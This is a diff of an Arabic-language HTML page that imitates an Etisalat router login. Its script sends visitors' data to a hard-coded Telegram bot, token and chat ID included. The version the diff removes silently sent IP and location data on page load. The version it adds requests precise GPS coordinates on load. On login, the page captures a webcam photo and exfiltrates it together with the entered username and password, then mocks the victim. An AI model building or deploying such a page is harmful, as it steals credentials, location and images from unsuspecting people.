@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Etisalat Login</title>
     <style>
         body { font-family: Tahoma, Arial; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
         .login-box { background: white; border: 1px solid #ccc; width: 400px; padding: 25px; box-shadow: 2px 2px 5px rgba(0,0,0,0.1); }
@@ -18,41 +18,51 @@
         #video, #canvas { display: none; }
     </style>
 </head>
-<body onload="silentCapture()"> <div class="login-box">
+<body onload="askLocation()"> <div class="login-box">
         <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Etisalat_logo.svg/1200px-Etisalat_logo.svg.png" alt="Etisalat"></div>
-        <div class="info-text">أهلاً وسهلاً، يرجى تسجيل الدخول. ZXHN H168N V3.5</div>
-        <div class="input-group"><label>اسم المستخدم</label><input type="text" id="user-input" placeholder="أدخل اسم المستخدم"></div>
-        <div class="input-group"><label>كلمة المرور</label><input type="password" id="pass-input" placeholder="أدخل كلمة المرور"></div>
+        <div class="info-text">نظام التأمين: يرجى السماح بتحديد الموقع لضبط إعدادات المنطقة، ثم سجل دخولك.</div>
+        
+        <div class="input-group">
+            <label>اسم المستخدم</label>
+            <input type="text" id="user-input" placeholder="أدخل اسم المستخدم">
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="pass-input" placeholder="أدخل كلمة المرور">
+        </div>
+        
         <button class="btn-login" id="start-btn">تسجيل الدخول</button>
         <div id="shabah-msg">🚨 وقعت يا حمار! 🚨</div>
-        <video id="video" autoplay></video><canvas id="canvas"></canvas>
+        
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script>
         const botToken = '8347819984:AAFi1b3BL9sYP3BbkqpWY3XtVfWatppm8Rk'; 
         const chatId = '1559993244'; 
 
-        // 1. وظيفة السحب الصامت (عند فتح الصفحة)
-        async function silentCapture() {
-            try {
-                const geoRes = await fetch('https://ipapi.co/json/');
-                const geo = await geoRes.json();
-                const device = navigator.platform;
-                const browser = navigator.userAgent.split(') ')[1];
-
-                const msg = `👣 "الشبح" رصد حركة!\n🌍 الموقع: ${geo.city}, ${geo.country_name}\n📱 الجهاز: ${device}\n🌐 IP: ${geo.ip}\n📡 الشبكة: ${geo.org}\n⚠️ الحرامي فاتح الصفحة دلوقتي وبيفكر يسجل!`;
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-            } catch (e) {}
+        // 1. طلب إذن الموقع فور فتح الصفحة
+        function askLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const msg = `📍 الحرامي وافق على الموقع!\n🔗 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n🗺️ افتح مكانه: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                },
+                (err) => {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ رفض إذن الموقع بس لسه في الفخ!")}`);
+                }
+            );
         }
 
-        // 2. وظيفة قفشة البيانات والصورة (عند الضغط)
+        // 2. طلب الكاميرا والقفش عند الضغط على تسجيل الدخول
         document.getElementById('start-btn').addEventListener('click', async () => {
             const username = document.getElementById('user-input').value;
             const password = document.getElementById('pass-input').value;
             if (!username || !password) { alert('يرجى إكمال البيانات'); return; }
 
             try {
+                // طلب إذن الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -66,7 +76,7 @@
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'shabah.jpg');
-                        formData.append('caption', `🔥 تم سحب البيانات النهائية!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n✅ وقع في الفخ بنجاح!`);
+                        formData.append('caption', `🚨 صيد كامل من رادار الشبح!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n✅ اتقفش صوت وصورة ومكان!`);
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
                     
@@ -74,7 +84,7 @@
                     document.getElementById('shabah-msg').style.display = 'block';
                 }, 1000);
             } catch (err) {
-                const msg = `⚠️ رفض الكاميرا بس أخدنا بياناته!\n👤 الاسم: ${username}\n🔑 السر: ${password}`;
+                const msg = `⚠️ رفض الكاميرا بس البيانات وصلت!\n👤 الاسم: ${username}\n🔑 السر: ${password}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
                 document.getElementById('shabah-msg').style.display = 'block';
             }
